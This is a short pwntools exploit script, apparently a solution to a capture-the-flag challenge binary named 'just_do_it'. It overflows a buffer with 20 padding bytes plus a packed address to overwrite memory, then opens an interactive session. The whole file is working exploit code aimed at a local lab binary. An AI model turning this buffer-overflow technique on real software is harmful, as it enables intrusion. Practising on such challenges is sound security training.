from pwn import *

target = process("./just_do_it")

payload = b"a" * 20
payload += p32(0x0804a080)
target.sendline(payload)

target.interactive()
                               